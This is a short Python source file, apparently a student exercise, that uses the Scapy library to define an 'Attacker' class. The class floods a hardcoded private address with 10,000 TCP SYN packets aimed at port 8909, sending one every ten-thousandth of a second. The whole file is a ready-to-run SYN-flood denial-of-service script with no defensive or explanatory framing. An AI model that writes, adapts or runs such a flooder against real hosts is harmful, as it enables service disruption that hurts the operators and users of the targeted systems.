"""
Author: Tom Lev
Date: 11/05/23
"""
from scapy.all import *
from scapy.layers.inet import IP, TCP


class Attacker:
    def __init__(self, target_ip: str, packets_amount: int):
        """
        the init function, which initializes all the parameters.
        :param target_ip: str
        :param packets_amount: int
        """
        self.target = target_ip
        self.amount = packets_amount

    def send_packets(self):
        """
        sends the given amount of packets, in the rate of packet per 0.0001 seconds
        :return: nothing
        """
        i = 1
        while i < self.amount:
            IP1 = IP(dst=self.target)
            TCP1 = TCP(dport=8909,flags="S") / Raw(load='tom')
            pkt = IP1 / TCP1
            send(pkt, inter=.0001)

            print("packet sent ", i, pkt[IP].src)
            i = i + 1


a = Attacker("172.16.6.69", 10000)
a.send_packets()
